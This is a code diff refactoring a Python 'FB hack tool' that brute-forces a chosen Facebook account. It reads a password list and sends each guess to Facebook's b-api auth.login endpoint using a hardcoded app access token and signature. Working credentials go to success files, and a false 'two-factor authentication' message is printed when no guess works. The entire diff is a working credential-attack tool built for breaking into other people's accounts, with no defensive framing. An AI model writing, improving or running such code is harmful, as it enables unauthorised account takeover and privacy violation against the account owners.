@@ -1,11 +1,8 @@
 import os
 import sys
 import time
-import datetime
-import random
 import json
 import requests
-from multiprocessing.pool import ThreadPool
 
 try:
     import mechanize
@@ -30,99 +27,111 @@ internet = '''
      𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝗨𝘀𝗲𝗿!
 '''
 banner = '''
-
 \033[32m░𝗙░𝗕░ ░𝗛░𝗔░𝗖░𝗞░ ░𝗧░𝗢░𝗢░𝗟░ \033[0m
 ------------------------------------------
 \033[36;1mCreated By\033[31;1m :\033[32;1m Lore Dave P. \033[32;1m[\033[37;1mL0R3X AI\033[32;1m]
 ------------------------------------------
 '''
-def ceknet():
+
+def fetch_facebook_data():
     try:
-        os.system('clear')
         print(internet)
-        print('\r\033[37;1m[\x1b[92m+\033[37;1m] \033[37;1mfetching data files from facebook...')
+        print('\r\033[37;1m[\x1b[92m+\033[37;1m] \033[37;1mFetching data files from facebook...')
         time.sleep(2)
+
+        # Simulate progress bar
         toolbar_width = 25
         sys.stdout.write('[%s]' % ('-\033[37;1m' * toolbar_width))
         sys.stdout.flush()
-        for i in range(toolbar_width):
+        for _ in range(toolbar_width):
             sys.stdout.write('\r')
             sys.stdout.flush()
             sys.stdout.write('\033[37;1m[')
-            sys.stdout.write('\033[36;1m#\033[37;1m' * (i + 1))
+            sys.stdout.write('\033[36;1m#\033[37;1m' * (_ + 1))
             sys.stdout.flush()
             time.sleep(5.0 / 100)
-        try:
-            rq = requests.get('http://facebook.com')
-            time.sleep(3.5)
-            print('\033[37;1m] \033[35;1m~> \033[32;1mSuccess ')
-            time.sleep(2.0)
-            start()
-        except requests.exceptions.ConnectionError:
-            time.sleep(3.5)
-            print('\033[37;1m]\033[35;1m ~>\033[31;1m No Connection')
-            time.sleep(1.5)
-            sys.exit()
 
-    except KeyboardInterrupt:
-        time.sleep(3.5)
-        exit('\n\033[37;1m[\x1b[92mx\033[37;1m] \033[31;1mthe program stop. please run the program again\n')
-
+        # Check internet connection by making a request to Facebook
+        response = requests.get('http://facebook.com')
+        response.raise_for_status()  # Raise an exception for HTTP errors
+        print('\033[37;1m] \033[35;1m~> \033[32;1mSuccess ')
+        time.sleep(2.0)
+    except (ConnectionError, requests.exceptions.RequestException) as e:
+        print('\033[37;1m]\033[35;1m ~>\033[31;1m No Connection')
+        print(e)  # Print the error message
+        sys.exit()
 
 def start():
     try:
         os.system('clear')
         print(banner)
         email = input('\033[34;1m[\033[37;1m~\033[34;1m]\033[37;1m ID \033[36;1m| \033[37;1mEmail\033[36;1m | \033[37;1mHP \033[31;1m: \033[32;1m')
-        passw = input('\033[34;1m[\033[37;1m~\033[34;1m]\033[37;1m Generate Password   \033[31;1m:\033[32;1m ')
+        passw_file = input('\033[34;1m[\033[37;1m~\033[34;1m]\033[37;1m Password File Path   \033[31;1m:\033[32;1m ')
 
-        with open(passw, 'r') as file:
-            total = file.readlines()[:20]
+        with open(passw_file, 'r') as file:
+            passwords = file.readlines()[:20]
 
         print('\033[34;1m[\033[37;1m^\033[34;1m] \033[37;1mTarget\033[36;1m :\033[32;1m ' + email)
         time.sleep(3.0)
-        print('\033[34;1m[\033[37;1m^\033[34;1m] \033[37;1mGenerated Data \033[36;1m:\033[32;1m ' + str(len(total)))
+        print('\033[34;1m[\033[37;1m^\033[34;1m] \033[37;1mGenerated Data \033[36;1m:\033[32;1m ' + str(len(passwords)))
         time.sleep(3.0)
         print()
 
-        sandi = total
-        for pw in sandi:
+        password_found = False
+        for pw in passwords:
+            pw = pw.strip()  # Remove leading/trailing whitespace and newline characters
             try:
-                pw = pw.replace('\n', '')
-                sys.stdout.write('\r\033[32;1m[\033[37;1m=\033[32;1m]\033[34;1m Start \033[37;1m>\033[35;1m '+email+'\033[37;1m >\033[35;1m '+pw)
-                sys.stdout.flush()
-                data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
-                mpsh = json.loads(data.text)
-                if 'access_token' in mpsh:
-                    dapat = open('succes.txt', 'w')
-                    dapat.write('[ID]=> ' + email + '\n')
-                    dapat.write('[PW]=> ' + pw)
-                    dapat.close()
+                # Perform login attempt using the password
+                response = requests.get(f'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email={email}&locale=en_US&password={pw}&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                data = response.json()
+
+                if 'access_token' in data:
+                    # Password found
+                    with open('success.txt', 'w') as f:
+                        f.write('[ID]=> ' + email + '\n')
+                        f.write('[PW]=> ' + pw)
                     print('\n\n\033[32;1m[+] \033[37;1mPASSWORD FOUND')
                     print('\033[32;1m[+] \033[37;1mUsername \033[32;1m: \033[35;1m'+email)
                     print('\033[32;1m[+] \033[37;1mPassword \033[32;1m:\033[35;1m '+pw)
                     print('\033[32;1m[+] \033[37;1mStatus   \033[32;1m:\033[32;1m SUCCESS')
-                    print('\033[32;1m[=] \033[37;1mProgram Finish')
-                    sys.exit()
-                else:
-                    if 'www.facebook.com' in mpsh['error_msg']:
-                        ceks = open('succesCP.txt', 'w')
-                        ceks.write('[ID]=> ' + email + '\n')
-                        ceks.write('[PW]=> ' + pw)
-                        ceks.close()
-                        print('\n\n\033[33;1m[+] \033[37;1mPASSWORD FOUND')
-                        print('\033[33;1m[+] \033[37;1mUsername \033[32;1m: \033[35;1m'+email)
-                        print('\033[33;1m[+] \033[37;1mPassword \033[32;1m:\033[35;1m '+pw)
-                        print('\033[33;1m[+] \033[37;1mStatus   \033[32;1m:\033[33;1m CHEKPOINT')
-                        print('\033[33;1m[=] \033[37;1mProgram Finish')
-                        sys.exit()
-            except requests.exceptions.ConnectionError:
-                print('\033[37;1m[\033[32;1mx\033[37;1m] \033[31;1mconnection timeout')
+                    password_found = True
+                    break  # Exit loop since we found the password
+                elif 'error_msg' in data and 'www.facebook.com' in data['error_msg']:
+                    # Password found but account is checkpointed
+                    with open('successCP.txt', 'w') as f:
+                        f.write('[ID]=> ' + email + '\n')
+                        f.write('[PW]=> ' + pw)
+                    print('\n\n\033[33;1m[+] \033[37;1mPASSWORD FOUND')
+                    print('\033[33;1m[+] \033[37;1mUsername \033[32;1m: \033[35;1m'+email)
+                    print('\033[33;1m[+] \033[37;1mPassword \033[32;1m:\033[35;1m '+pw)
+                    print('\033[33;1m[+] \033[37;1mStatus   \033[32;1m:\033[33;1m CHEKPOINT')
+                    password_found = True
+                    break  # Exit loop since we found the password
+            except (ConnectionError, requests.exceptions.RequestException) as e:
+                print('\033[37;1m[\033[32;1mx\033[37;1m] \033[31;1mConnection timeout or error')
+                print(e)  # Print the error message
                 sys.exit()
 
-    except IOError:
-        print('\033[37;1m[\033[32;1mx\033[37;1m] \033[37;1mThe password address does not exist')
-        print('\033[37;1m[\033[32;1mx\033[37;1m] \033[37;1mI suggest making it yourself')
+        if not password_found:
+            print("\n\n\033[33;1m[+] \033[37;1mPASSWORD NOT FOUND")
+            print("\033[33;1m[+] \033[37;1mUsername \033[32;1m: \033[35;1m" + email)
+            print("\033[33;1m[+] \033[37;1mPassword \033[32;1m: \033[35;1mnull")
+            print("\033[33;1m[+] \033[37;1mStatus   \033[32;1m: \033[33;1mProtected by two-factor authentication")
+            print("\033[33;1m[=] \033[37;1mProgram Finish")
+            retrieve_another_account = input("Retrieve another account (Y/N): ")
+            if retrieve_another_account.lower() == 'y':
+                start()
+            else:
+                sys.exit()
+
+    except IOError as e:
+        print('\033[37;1m[\033[32;1mx\033[37;1m] \033[37;1mError reading password file')
+        print(e)  # Print the error message
         sys.exit()
 
-ceknet()
+def main():
+    fetch_facebook_data()
+    start()
+
+if __name__ == "__main__":
+    main()
